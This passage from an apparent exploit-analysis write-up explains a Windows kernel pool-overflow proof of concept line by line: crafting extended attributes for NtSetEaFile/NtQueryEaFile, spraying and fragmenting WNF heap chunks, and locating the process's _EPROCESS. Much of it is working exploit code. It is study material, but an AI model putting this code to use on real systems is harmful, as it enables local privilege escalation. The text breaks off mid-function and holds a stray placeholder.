<pre><code class="language-cpp">overflow = (PFILE_FULL_EA_INFORMATION)((UINT64)payload + (UINT64)(payload-&gt;NextEntryOffset));
</code></pre>
<p>Here, we see that the <code>FILE_FULL_EA_INFORMATION</code> data structure exactly after the <code>payload</code> pointer is then assigned to <code>overflow</code>.</p>
<pre><code class="language-cpp">overflow-&gt;NextEntryOffset = (ULONG)0x0;
</code></pre>
<p>Next, we see that the <code>NextEntryOffset</code> is then set to <code>0x0</code>, indicating that there are no other entries beyond <code>overflow</code>.</p>
<pre><code class="language-cpp">overflow-&gt;Flags = (UCHAR)0x0;
</code></pre>
<p>As with <code>payload</code>, we set the <code>EaNameLength</code> member for <code>overflow</code> to the length of the <em>ExtendedAttribute</em> name, in the case for <code>overflow</code>, it's the length of <code>EANAME2</code> which is the string <code>bcd</code>.</p>
<pre><code class="language-cpp">overflow-&gt;EaNameLength = (UCHAR)strlen(EANAME2);
</code></pre>
<p>Next, the input argument <code>overflow_chunk_sz</code> is used to set the <code>EaValueLength</code>. According to Y3A's proof-of-concept, the value of <code>overflow_chunk_sz</code> is <code>0x18</code>. This is done to match the second <code>memcpy</code> operation for the size of the overflow chunk.</p>
<pre><code class="language-cpp">overflow-&gt;EaValueLength = (USHORT)overflow_chunk_sz;
</code></pre>
<p>We then see that a <code>memcpy</code> operation is performed at <code>EaName</code> where the value <code>EANAME2</code> is copied of size <code>EaNameLength</code>.</p>
<pre><code class="language-cpp">memcpy(overflow-&gt;EaName, EANAME2, overflow-&gt;EaNameLength);
</code></pre>
<p>Finally, we then perform a <code>memcpy</code> to overflow the first 0x10 bytes after the next pool header, which equates to 0x20 bytes.</p>
<pre><code class="language-cpp">memcpy(overflow-&gt;EaName + overflow-&gt;EaNameLength + 0x1, overflow_data, overflow_data_sz);
</code></pre>
<p>We then assign the target <code>file</code> the <code>payload</code> <em>ExtendedAttribute</em>. Before analyzing the arguments used, let's first look at the function prototype for <code>NtSetEaFile</code> from <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FFile%2FNtSetEaFile.html">NTInternals</a>:</p>
<pre><code class="language-cpp">NtSetEaFile(
  IN HANDLE               FileHandle,
  OUT PIO_STATUS_BLOCK    IoStatusBlock,
  IN PVOID                EaBuffer,
  IN ULONG                EaBufferSize
);
</code></pre>
<p>Now, let's examine the implementation within <code>overflow_chunk</code>:</p>
<ul>
<li><code>file</code>: The handle <code>FileHandle</code>, in our case set to the file we created at <code>c:\\users\\chenl\\desktop\\ABC.txt</code>.</li>
<li><code>&amp;x</code>: The pointer to the output <code>IoStatusBlock</code> structure.</li>
<li><code>payload</code>: A pointer to the target <code>EaBuffer</code>.</li>
<li><code>0x300</code>: The size of the target <code>EaBuffer</code>.</li>
</ul>
<p>Let's now look at the call to <code>NtSetEaFile</code> in <code>overflow_chunk</code>:</p>
<pre><code class="language-cpp">status = _NtSetEaFile(file, &amp;x, payload, 0x300);
if (!NT_SUCCESS(status)) {
    log_warn("overflow_chunk::_NtSetEaFile()1");
    goto out;
}
</code></pre>
<p>We move onto the call to <code>NtQueryEaFile</code>:</p>
<pre><code class="language-cpp">status = _NtQueryEaFile(file, &amp;x, fetched_data, 0xaa, FALSE, vuln_selector, 0x300, NULL, TRUE);
if (!NT_SUCCESS(status)) {
    log_warn("overflow_chunk::_NtQueryEaFile()1");
    goto out;
}
</code></pre>
<p>As with <code>NtSetEaFile</code>, let's examine the function prototype from <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FFile%2FNtQueryEaFile.html">NTInternals</a>:</p>
<pre><code class="language-cpp">NtQueryEaFile(
  IN HANDLE               FileHandle,
  OUT PIO_STATUS_BLOCK    IoStatusBlock,
  OUT PVOID               Buffer,
  IN ULONG                Length,
  IN BOOLEAN              ReturnSingleEntry,
  IN PVOID                EaList OPTIONAL,
  IN ULONG                EaListLength,
  IN PULONG               EaIndex OPTIONAL,
  IN BOOLEAN              RestartScan
);
</code></pre>
<p>Now, let's examine the implementation within <code>overflow_chunk</code>:</p>
<ul>
<li><code>file</code>: The handle <code>FileHandle</code>, in our case set to the file we created at <code>c:\\users\\chenl\\desktop\\ABC.txt</code>.</li>
<li><code>&amp;x</code>: The pointer to the output <code>IoStatusBlock</code> structure.</li>
<li><code>fetched_data</code>: A pointer to the output <code>Buffer</code>.</li>
<li><code>0xaa</code>: The length of the buffer in bytes.</li>
<li><code>FALSE</code>: Do not return a single entry only.</li>
<li><code>vuln_selector</code>: The list of <code>FILE_GET_EA_INFORMATION</code> structures which contain the names of the file's <em>ExtendedAttributes</em>.</li>
<li><code>0x300</code>: The length of the <code>EaList</code> in bytes.</li>
<li><code>NULL</code>: The pointer to the index of the file's <em>ExtendedAttribute</em> structure.</li>
<li><code>TRUE</code>: Return the first queried <em>ExtendedAttribute</em>.</li>
</ul>
<p>Now that we have examined each and every function call in <code>overflow_chunk</code>, let's now look at the cleanup:</p>
<pre><code class="language-cpp">puts("[+] Overflowed into neighbouring chunk");

out:
if (file &amp;&amp; file != INVALID_HANDLE_VALUE)
    CloseHandle(file);

if (fetched_data)
    free(fetched_data);

if (vuln_selector)
    free(vuln_selector);

if (payload)
    free(payload);

return status;
</code></pre>
<p>We see that we close the file handle and free the memory regions that were used in <code>overflow_chunk</code>.</p>
<h3 id="the-fragment_heap-function"><a class="header" href="#the-fragment_heap-function">The fragment_heap Function</a></h3>
<p>We start our analysis of the <code>fragment_heap</code> function by reviewing the function arguments and return type:</p>
<pre><code class="language-cpp">NTSTATUS fragment_heap(_Inout_ PWNF_STATE_NAME statenames, _In_ UINT64 count)
</code></pre>
<p>The <code>fragment_heap</code> function returned an <code>NTSTATUS</code> value depending on the success of the function's execution. The first argument, <code>statenames</code>, is a modifiable pointer of type <code>PWNF_STATE_NAME</code>, whose type definition is below:</p>
<pre><code class="language-cpp">typedef struct _WNF_STATE_NAME
{
    ULONG Data[2];
} WNF_STATE_NAME, *PWNF_STATE_NAME, *PCWNF_STATE_NAME;
</code></pre>
<p>Next, the variable <code>count</code> is a read-only unsigned 64-bit integer which specifies the amount of holes created of size 0xc0 in the heap. Let's now look at the two variable definitions:</p>
<pre><code class="language-cpp">NTSTATUS    status = STATUS_SUCCESS;
UINT64      counter = 0;
</code></pre>
<p>First, we see that <code>status</code> is of type <code>NTSTATUS</code>, the same as the return value for <code>fragment_heap</code> and is initialized with the value <code>STATUS_SUCCESS</code>. Finally, we have the unsigned 64-bit integer <code>counter</code> which is initially set to 0.</p>
<p>With the variable definitions out of the way, let's review the main body of <code>fragment_heap</code>, which is a <code>for</code> loop used to iteratively delete WNF structures in the heap:</p>
<pre><code class="language-cpp">for (int i = 0; i &lt; count; i += 3) {
    // create holes
    status = _NtDeleteWnfStateData(&amp;(statenames[i]), NULL);
    if (!NT_SUCCESS(status)) {
        log_warn("fragment_heap::_NtDeleteWnfStateData()1");
        goto out;
    }

    status = _NtDeleteWnfStateName(&amp;(statenames[i]));
    if (!NT_SUCCESS(status)) {
        log_warn("fragment_heap::_NtDeleteWnfStateData()1");
        goto out;
    }

    statenames[i].Data[0] = 0;
    statenames[i].Data[1] = 0;
    
    counter++;
}
</code></pre>
<p>The <code>for</code> loop iterates by a step of 3 to a maximum value specified through the input parameter <code>count</code>. For each iteration, the address of the <code>statenames</code> entry at index <code>i</code> is provided to both <code>NtDeleteWnfStateData</code> and <code>NtDeleteWnfStateName</code>. If both calls are successful, the <code>Data</code> member at the <code>i</code>th index is set to <code>0</code> at both the <code>0</code> and <code>1</code> subindex. The <code>counter</code> value is then incremented.</p>
<pre><code class="language-cpp">printf("[+] Created 0x%llx holes of 0xc0 size in the heap\n", counter * 2);

out:
    return status;
</code></pre>
<p>Once the loop completes or is terminated, the <code>status</code> is then returned to the callee.</p>
<h3 id="the-spray_heap-function"><a class="header" href="#the-spray_heap-function">The spray_heap Function</a></h3>
<p>The <code>spray_heap</code> function is relatively small compared to the other functions we covered, let's go ahead and start its analysis by looking at the function's return type and input arguments:</p>
<pre><code class="language-cpp">NTSTATUS spray_heap(_Out_ PWNF_STATE_NAME statenames, _In_ UINT64 count, _In_ char *buf, _In_ UINT64 buf_sz)
</code></pre>
<p>As expected, the <code>spray_heap</code> function returns a <code>NTSTATUS</code> value. Looking at the input arguments we see the following:</p>
<ul>
<li><code>statenames</code>: A non-NULL point to a <code>PWNF_STATE_NAME</code> buffer.</li>
<li><code>count</code>: A read-only unsigned 64-bit value used as the upper limit to the heap spray.</li>
<li><code>buf</code>: A read-only pointer to a character array containing the value for the <code>Buffer</code> parameter for <code>NtUpdateWnfStateData</code>.</li>
<li><code>buf_sz</code>: A read-only unsigned 64-bit integer used as the <code>Length</code> parameter for <code>NtUpdateWnfStateData</code>.</li>
</ul>
<p>Let's now examine the two variable declarations used in <code>spray_heap</code>:</p>
<pre><code class="language-cpp">NTSTATUS                status = STATUS_SUCCESS;
SECURITY_DESCRIPTOR     *sd = (SECURITY_DESCRIPTOR *)zalloc(sizeof(SECURITY_DESCRIPTOR));
</code></pre>
<p>The first declaration for <code>status</code> is rather straightforward as its purpose is to return an <code>NTSTATUS</code> datatype based on the execution of <code>spray_heap</code>. Next, let's look at the pointer <code>sd</code>. According to <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-security_descriptor">Microsoft</a>,</p>
<blockquote>
<p>The <code>SECURITY_DESCRIPTOR</code> structure contains the security information associated with an object. Applications use this structure to set and query an object's security status.</p>
</blockquote>
<p>As we will eventually be setting the security descriptor for our call to <code>NtCreateWnfStateName</code>, we first need to ensure that our <code>sd</code> pointer was successfully allocated in memory:</p>
<pre><code class="language-cpp">if (!sd) {
    log_warn("spray_heap::zalloc()1");
    status = STATUS_NO_MEMORY;
    goto out;
}
</code></pre>
<p>Let's now take a look at the function prototype for <code>SECURITY_DESCRIPTOR</code>:</p>
<pre><code class="language-cpp">typedef struct _SECURITY_DESCRIPTOR {
  BYTE                        Revision;
  BYTE                        Sbz1;
  SECURITY_DESCRIPTOR_CONTROL Control;
  PSID                        Owner;
  PSID                        Group;
  PACL                        Sacl;
  PACL                        Dacl;
} SECURITY_DESCRIPTOR, *PISECURITY_DESCRIPTOR;
</code></pre>
<p>Each of these security descriptor members are set within <code>spray_heap</code> as shown below:</p>
<pre><code class="language-cpp">sd-&gt;Revision = 0x1;
sd-&gt;Sbz1 = 0;
sd-&gt;Control = 0x800c;
sd-&gt;Owner = 0;
sd-&gt;Group = (PSID)0;
sd-&gt;Sacl = (PACL)0;
sd-&gt;Dacl = (PACL)0;
</code></pre>
<h4 id="security-descriptor-members"><a class="header" href="#security-descriptor-members">Security Descriptor Members</a></h4>
<p>Based on <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7d4dac05-9cef-4563-a058-f108abecce1d">Microsoft's documentation</a>, let's examine what each means:</p>
<h5 id="revision"><a class="header" href="#revision">Revision</a></h5>
<p>According to Microsoft, <code>Revision</code> is:</p>
<blockquote>
<p>An unsigned 8-bit value that specifies the revision of the <code>SECURITY_DESCRIPTOR</code> structure. This field <strong>MUST</strong> be set to one.</p>
</blockquote>
<p>Since we are required to set this field to <code>0x1</code>, we can just move onto the next member.</p>
<h5 id="sbz1"><a class="header" href="#sbz1">Sbz1</a></h5>
<p>According to Microsoft, <code>Sbz1</code> is:</p>
<blockquote>
<p>An unsigned 8-bit value with no meaning unless the <em>Control RM</em> bit is set to <code>0x1</code>. If the RM bit is set to 0x1, Sbz1 is interpreted as the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/a66edeb1-52a0-4d64-a93b-2f5c833d7d92#gt_a7d0361f-8608-454d-9a52-67d4d181ae09">resource manager</a> control bits that contain <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/11e1608c-6169-4fbc-9c33-373fc9b224f4#Appendix_A_73">specific information</a> for the specific resource manager that is accessing the structure. The permissible values and meanings of these bits are determined by the implementation of the resource manager.</p>
</blockquote>
<p>We set this value to <code>0x0</code> and as such it has no meaning since the <em>Control RM</em> bit is not set to <code>0x1</code>.</p>
<h5 id="control"><a class="header" href="#control">Control</a></h5>
<p>According to Microsoft, <code>Control</code> is:</p>
<blockquote>
<p>An unsigned 16-bit field that specifies control access bit flags. The <em>Self Relative</em> (SR) bit MUST be set when the security descriptor is in self-relative format.</p>
</blockquote>
<p>Where the format is:</p>
<div class="table-wrapper"><table><thead><tr><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr></thead><tbody>
<tr><td>SR</td><td>RM</td><td>PS</td><td>PD</td><td>SI</td><td>DI</td><td>SC</td><td>DC</td><td>SS</td><td>DT</td><td>SD</td><td>SP</td><td>DD</td><td>DP</td><td>GD</td><td>OD</td></tr>
</tbody></table>
</div>
<p>And the bits are defined as:</p>
<div class="table-wrapper"><table><thead><tr><th>Value</th><th>Description</th></tr></thead><tbody>
<tr><td>Self-Relative (SR)</td><td>Set when the security descriptor is in self-relative format. Cleared when the security descriptor is in absolute format.</td></tr>
<tr><td>RM Control Valid (RM)</td><td>Set to 0x1 when the Sbz1 field is to be interpreted as resource manager control bits.</td></tr>
<tr><td>SACL Protected (PS)</td><td>Set when the SACL will be protected from inherit operations.</td></tr>
<tr><td>DACL Protected (PD)</td><td>Set when the DACL will be protected from inherit operations.</td></tr>
<tr><td>SACL Auto-Inherited (SI)</td><td>Set when the SACL was created through inheritance.</td></tr>
<tr><td>DACL Auto-Inherited (DI)</td><td>Set when the DACL was created through inheritance.</td></tr>
<tr><td>SACL Computed Inheritance Required (SC)</td><td>Set when the SACL is to be computed through inheritance. When both SC and SI are set, the resulting security descriptor sets SI; the SC setting is not preserved.</td></tr>
<tr><td>DACL Computed Inheritance Required (DC)</td><td>Set when the DACL is to be computed through inheritance. When both DC and DI are set, the resulting security descriptor sets DI; the DC setting is not preserved.</td></tr>
<tr><td>Server Security (SS)</td><td>Set when the caller wants the system to create a Server ACL based on the input ACL, regardless of its source (explicit or defaulting).</td></tr>
<tr><td>DACL Trusted (DT)</td><td>Set when the ACL that is pointed to by the DACL field was provided by a trusted source and does not require any editing of compound ACEs.</td></tr>
<tr><td>SACL Defaulted (SD)</td><td>Set when the SACL was established by default means.</td></tr>
<tr><td>SACL Present (SP)</td><td>Set when the SACL is present on the object.</td></tr>
<tr><td>DACL Defaulted (DD)</td><td>Set when the DACL was established by default means.</td></tr>
<tr><td>DACL Present (DP)</td><td>Set when the DACL is present on the object.</td></tr>
<tr><td>Group Defaulted (GD)</td><td>Set when the group was established by default means.</td></tr>
<tr><td>Owner Defaulted (OD)</td><td>Set when the owner was established by default means.</td></tr>
</tbody></table>
</div>
<p>In our case, let's take the hexadecimal value <code>0x800c</code> and convert it to binary:</p>
<pre><code>1000000000001100
</code></pre>
<p>Using our bit format table, we see that the following fields are set:</p>
<ul>
<li>Self-Relative</li>
<li>DACL Defaulted</li>
<li>DACL Present</li>
</ul>
<p>According to <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/absolute-and-self-relative-security-descriptors">Microsoft</a>:</p>
<blockquote>
<p>In self-relative format, a security descriptor always begins with a <a href="https://learn.microsoft.com/en-us/windows/desktop/api/Winnt/ns-winnt-security_descriptor">SECURITY_DESCRIPTOR</a> structure, but the other components of the security descriptor can follow the structure in any order. Instead of using memory addresses, the security descriptor's components are identified by offsets from the beginning of the descriptor. This format is useful when a security descriptor must be stored on disk, transmitted by means of a communications protocol, or copied in memory.</p>
</blockquote>
<p>Now that we know the <code>Control</code> properties of our Security Descriptor, let's move onto the next member of our <code>sd</code> structure.</p>
<h5 id="owner"><a class="header" href="#owner">Owner</a></h5>
<p>According to Microsoft, <code>Owner</code> is <code>OffsetOwner</code> and is defined as :</p>
<blockquote>
<p>An unsigned 32-bit integer that specifies the offset to the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/78eb9013-1c3a-4970-ad1f-2b1dad588a25">SID</a>. This SID specifies the owner of the object to which the security descriptor is associated. This must be a valid offset if the OD flag is not set. If this field is set to zero, the <code>OwnerSid</code> field MUST not be present.</p>
</blockquote>
<p>As per Microsoft's documentation, we see that since the <code>Owner</code> flag is set to <code>0x0</code>, no further analysis is required except to ensure the <code>OwnerSid</code> field is not present.</p>
<h5 id="group"><a class="header" href="#group">Group</a></h5>
<p>According to Microsoft, <code>Group</code> is <code>OffsetGroup</code> and is defined as:</p>
<blockquote>
<p>An unsigned 32-bit integer that specifies the offset to the SID. This SID specifies the group of the object to which the security descriptor is associated. This must be a valid offset if the GD flag is not set. If this field is set to zero, the <code>GroupSid</code> field MUST not be present.</p>
</blockquote>
<p>In our proof-of-concept we see that the value <code>0x0</code> is cast to the datatype <code>PSID</code> before being assigned to the <code>Group</code> member. Reviewing the <a href="https://github.com/tpn/winsdk-10/blob/master/Include/10.0.14393.0/um/AclAPI.h"><code>AclAPI.h</code> Windows header</a>, we see that the actual structure of <code>PSID</code> varies. Thus, simply casting it to <code>PSID</code> and relying on the program to set the structure makes sense. In addition, it is also worth noting the same applied to the <code>PACL</code> data structure.</p>
<h5 id="sacl"><a class="header" href="#sacl">Sacl</a></h5>
<p>According to Microsoft, <code>SACL</code> is <code>OffsetSacl</code> and is defined as:</p>
<blockquote>
<p>An unsigned 32-bit integer that specifies the offset to the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/20233ed8-a6c6-4097-aafa-dd545ed24428">ACL</a> that contains system ACEs. Typically, the system ACL contains auditing ACEs (such as <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/9431fd0f-5b9a-47f0-b3f0-3015e2d0d4f9">SYSTEM_AUDIT_ACE</a>, <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/bd6b6fd8-4bef-427e-9a43-b9b46457e934">SYSTEM_AUDIT_CALLBACK_ACE</a>, or <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/949b02e7-f55d-4c26-969f-52a009597469">SYSTEM_AUDIT_CALLBACK_OBJECT_ACE</a>), and at most one Label ACE (as specified in section <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/25fa6565-6cb0-46ab-a30a-016b32c4939a">2.4.4.13</a>). This must be a valid offset if the SP flag is set; if the SP flag is not set, this field MUST be set to zero. If this field is set to zero, the <code>Sacl</code> field <strong>MUST</strong> not be present.</p>
</blockquote>
<p>In the proof-of-concept, we cast the value of <code>Sacl</code> to the <code>PACL</code> data structure before assigning it a value of <code>0x0</code>.</p>
<ul>
<li><code>sd-&gt;Sacl = (PACL)0;</code>: PLACEHOLDER</li>
</ul>
<h5 id="dacl"><a class="header" href="#dacl">Dacl</a></h5>
<p>According to Microsoft, <code>Dacl</code> is <code>OffsetDacl</code> and is defined as:</p>
<blockquote>
<p>An unsigned 32-bit integer that specifies the offset to the ACL that contains ACEs that control access. Typically, the DACL contains ACEs that grant or deny access to principals or groups. This must be a valid offset if the DP flag is set; if the DP flag is not set, this field MUST be set to zero. If this field is set to zero, the <code>Dacl</code> field MUST not be present.</p>
</blockquote>
<p>In the proof-of-concept, we cast the value of <code>Dacl</code> to the <code>PACL</code> data structure before assigning it a value of <code>0x0</code>.</p>
<p>Now that we have reviewed the member assignments of our <code>SECURITY_DESCRIPTOR</code> instantiation, let's now examine the calls to both <code>NtCreateWnfStateName</code> and <code>NtUpdateWnfStateData</code>:</p>
<pre><code class="language-cpp">for (int i = 0; i &lt; count; i++) {
    status = _NtCreateWnfStateName(&amp;(statenames[i]), WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, sd);
    if (!NT_SUCCESS(status)) {
        log_warn("spray_heap::_NtCreateWnfStateName()1");
        goto out;
    }

    status = _NtUpdateWnfStateData(&amp;(statenames[i]), buf, buf_sz, 0, 0, 0, 0); // spray 0xc0 sized kernel chunks
    if (!NT_SUCCESS(status)) {
        log_warn("spray_heap::_NtUpdateWnfStateName()1");
        goto out;
    }
}

printf("[+] Sprayed 0x%llx chunks of 0xc0 sized WNF structures\n", count * 2);

out:
if (sd)
    free(sd);

return status;
</code></pre>
<p>We start with a <code>for</code> loop that steps by <code>0x1</code> until the maximum value specified by <code>count</code> is reached. In the loop, let's first examine the call to <code>NtCreateWnfStateName</code>:</p>
<pre><code class="language-cpp">status = _NtCreateWnfStateName(&amp;(statenames[i]), WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, sd);
</code></pre>
<p>Let's look at the function prototype for <a href="https://github.com/winsiderss/phnt/blob/master/ntexapi.h"><code>NtCreateWnfStateName</code></a>:</p>
<pre><code class="language-cpp">NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateWnfStateName(
    _Out_ PWNF_STATE_NAME StateName,
    _In_ WNF_STATE_NAME_LIFETIME NameLifetime,
    _In_ WNF_DATA_SCOPE DataScope,
    _In_ BOOLEAN PersistData,
    _In_opt_ PCWNF_TYPE_ID TypeId,
    _In_ ULONG MaximumStateSize,
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor
    );
</code></pre>
<p>Let's now examine each parameter in-context of the implementation within <code>spray_heap</code>:</p>
<ul>
<li><code>&amp;(statenames[i]</code>: The memory address of the ith item in the <code>statenames</code> array.</li>
<li><code>WnfTemporaryStateName</code>: Examining the <a href="https://chromium.googlesource.com/external/github.com/DynamoRIO/drmemory/+/refs/heads/master/wininc/ntexapi.h">function prototype</a> for <code>WNF_STATE_NAME_LIFETIME</code>, we see 4 predefined constants:</li>
</ul>
<pre><code class="language-cpp">typedef enum _WNF_STATE_NAME_LIFETIME {
    WnfWellKnownStateName,
    WnfPermanentStateName,
    WnfPersistentStateName,
    WnfTemporaryStateName
} WNF_STATE_NAME_LIFETIME;
</code></pre>
<p>Based on the variable name, we can assume that this constant is needed within this particular context for <code>NtCreateWnfStateName</code>. As the Windows Notification Facility (WNF) can be a complete deep-dive on its own, we will not go into too much depth exploring why <code>WnfTemporaryStateName</code> is used versus other constants and also why a constant is needed in the first place. However, if you are interested in exploring the topic further, <a href="https://blog.quarkslab.com/playing-with-the-windows-notification-facility-wnf.html">Alex Ionescu</a> has a great blogpost that provides an excellent analysis of the Windows Notification Facility.</p>
<ul>
<li><code>WnfDataScopeMachine</code>: As with <code>WnfTemporaryStateName</code>, we see that this value as well is a predefined constant:</li>
</ul>
<pre><code class="language-cpp">typedef enum _WNF_DATA_SCOPE
{
  WnfDataScopeSystem = 0x0,
  WnfDataScopeSession = 0x1,
  WnfDataScopeUser = 0x2,
  WnfDataScopeProcess = 0x3,
  WnfDataScopeMachine = 0x4,
} WNF_DATA_SCOPE;
</code></pre>
<ul>
<li><code>FALSE</code>: We can assume this value indicates something to do with not persisting data, but exploring the exact reasoning behind this argument is out-of-scope for this paper.</li>
<li><code>0</code>: See see the optional <code>TypeId</code> set.</li>
<li><code>0x1000</code>: Indicates the maximum state size.</li>
<li><code>sd</code>: Finally, our previously modified Security Descriptor is then included into the <code>NtCreateWnfStateName</code> function call.</li>
</ul>
<p>Even though we weren't able to define the exact purpose of every single argument for <code>NtCreateWnfStateName</code>, it serves as an important reminder that reverse engineering native Windows vulnerabilities and binaries is a monumental task. Therefore, it is always important to keep sight on the end goal without getting too caught up in the weeds.</p>
<p>Moving onto the next function call, <code>NtUpdateWnfStateData</code>, we start by taking a look at it's implementation within <code>spray_heap</code>:</p>
<pre><code class="language-cpp">status = _NtUpdateWnfStateData(&amp;(statenames[i]), buf, buf_sz, 0, 0, 0, 0); // spray 0xc0 sized kernel chunks
</code></pre>
<p>With this in-mind, let's look at the function prototype for <a href="https://github.com/winsiderss/phnt/blob/master/ntexapi.h"><code>NtUpdateWnfStateData</code></a>:</p>
<pre><code class="language-cpp">NTSYSCALLAPI
NTSTATUS
NTAPI
NtUpdateWnfStateData(
    _In_ PCWNF_STATE_NAME StateName,
    _In_reads_bytes_opt_(Length) const VOID *Buffer,
    _In_opt_ ULONG Length,
    _In_opt_ PCWNF_TYPE_ID TypeId,
    _In_opt_ const VOID *ExplicitScope,
    _In_ WNF_CHANGE_STAMP MatchingChangeStamp,
    _In_ LOGICAL CheckStamp
    );
</code></pre>
<p>As with the previous function call, let's walk through the parameters used in <code>NtUpdateWnfStateData</code> by <code>spray_heap</code>. First, the memory address of the ith <code>statename</code> element is passed as the buffer <code>buf</code> and buffer size <code>buf_sz</code>. Both <code>buf</code> and <code>buf_sz</code> are passed into <code>spray_heap</code> as arguments. When looking at the <code>main</code> function, we see that <code>buf</code> is a character buffer of size <code>0xa0</code>. Further research is required to determine if <code>0xa0</code> can be an arbitrary size or if it needs to be equal to its current value.</p>
<p>Finally, after the two function calls complete, <code>sd</code> is freed and the function returns with the <code>NT_STATUS</code>.</p>
<h4 id="sandbox-constraints-2"><a class="header" href="#sandbox-constraints-2">Sandbox Constraints</a></h4>
<p>One thing to keep in mind is that both the <code>NtCreateWnfStateName</code> and <code>NtUpdateWnfStateName</code> functions are unavailable when operating in Low Integrity.</p>
<h3 id="the-get_eproc-function"><a class="header" href="#the-get_eproc-function">The get_eproc Function</a></h3>
<p>Before diving into the internals of the <code>get_eproc</code> function, let's take a step back and discuss the purpose of this function. According to <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess">Microsoft</a>:</p>
<blockquote>
<p>The <code>EPROCESS</code> structure is an opaque structure that serves as the process object for a process.</p>
</blockquote>
<p>While we will soon see the importance of having the <code>_EPROCESS</code> address when we go through the <code>main</code> function, suffice to say that <code>get_eproc</code> is important in that it sets the stage for both enumeration and exploitation. Let's now look at the return type and parameter for <code>get_eproc</code>:</p>
<pre><code class="language-cpp">NTSTATUS get_eproc(_Out_ PULONG_PTR eproc)
</code></pre>
<p>First, the <code>get_eproc</code> function returns a <code>NTSTATUS</code> value upon completion. Next, a non-NULL <code>PULONG_PTR</code> pointer called <code>eproc</code> is passed to <code>get_eproc</code>. According to <a href="https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types">Microsoft</a>, <code>PULONG_PTR</code> is:</p>
<blockquote>
<p>A pointer to a ULONG_PTR</p>
</blockquote>
<p>Where <code>ULONG_PTR</code> is:</p>
<blockquote>
<p>An unsigned LONG_PTR</p>
</blockquote>
<p>Where <code>LONG_PTR</code> is:</p>
<blockquote>
<p>A signed long type for pointer precision. Use when casting a pointer to a long to perform pointer arithmetic.</p>
</blockquote>
<p>While the recursive nature of the definition is oftentimes overbearing, sometimes it's good to always validate the definition of a type rather than constantly assuming it based on the naming convention.</p>
<p>Next, let's review the variable definitions:</p>
<pre><code class="language-cpp">NTSTATUS                   status = STATUS_UNSUCCESSFUL;
PSYSTEM_HANDLE_INFORMATION handle_info = NULL;
UINT64                     handle_info_sz = 0x10000;
HANDLE                     current_proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, GetCurrentProcessId());
</code></pre>
<p>Let's now review each variable's purpose and implementation:</p>
<ul>
<li><code>status</code>: Interestingly enough, unlike the previous functions we covered, <code>get_eproc</code> has a default <code>status</code> value of <code>STATUS_UNSUCCESSFUL</code>. This makes sense logically as the function needs to obtain the <code>_EPROCESS</code> value and if it does not have it, the function has failed.</li>
<li><code>handle_info</code>: A pointer to the below <code>_SYSTEM_HANDLE_INFORMATION</code> structure initially set to null.</li>
</ul>
<pre><code class="language-cpp">typedef struct _SYSTEM_HANDLE_INFORMATION
{
    DWORD           NumberOfHandles;
    SYSTEM_HANDLE   Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
</code></pre>
<ul>
<li><code>handle_info_sz</code>: The size of allocated memory to be used for the <code>handle_info</code> pointer. In our case it is set to <code>0x10000</code>.</li>
<li><code>current_proc</code>: If successful, the call to the function <code>OpenProcess</code> will return a handle to the current process object. This will eventually be used</li>
</ul>
<p>Next, let's look into the memory allocation prepping our <code>handle_info</code> pointer for the <code>NtQuerySystemInformation</code> function call:</p>
<pre><code class="language-cpp">printf("[+] Finding _EPROCESS address of current process: %ld\n", GetCurrentProcessId());

handle_info = (PSYSTEM_HANDLE_INFORMATION)zalloc(handle_info_sz);
if (!handle_info) {
    log_warn("get_eproc::zalloc()1");
    status = STATUS_NO_MEMORY;
    goto out;
}
</code></pre>
<p>After initializing the <code>handle_info</code> pointer to <code>NULL</code>, we now allocate the <code>PSYSTEM_HANDLE_INFORMATION</code> structure with a memory region of size <code>handle_info_sz</code>. If the allocation fails, the function terminates early and returns the <code>NT_STATUS</code> value <code>STATUS_NO_MEMORY</code>.</p>
<p>With our memory allocation of <code>handle_info</code> complete, we will now enter a while loop that only breaks when the <code>NT_STATUS</code> return value of <code>NtQuerySystemInformation</code> is not equal to <code>STATUS_INFO_LENGTH_MISMATCH</code>. We will discuss in-detail later why the loop checks the <code>NT_STATUS</code> value against the constant <code>STATUS_INFO_LENGTH_MISMATCH</code>. But for now, let's look at the loop in its entirety:</p>
<pre><code class="language-cpp">while ((status = _NtQuerySystemInformation(
    SystemHandleInformation,
    handle_info,
    handle_info_sz,
    NULL)) == STATUS_INFO_LENGTH_MISMATCH) {

    handle_info = realloc(handle_info, handle_info_sz *= 2);
    if (!handle_info) {
        log_warn("get_eproc::realloc()1");
        status = STATUS_NO_MEMORY;
        goto out;
    }
}

if (!NT_SUCCESS(status)) {
    log_warn("get_eproc::NtQuerySystemInformation()1");
    goto out;
}
</code></pre>
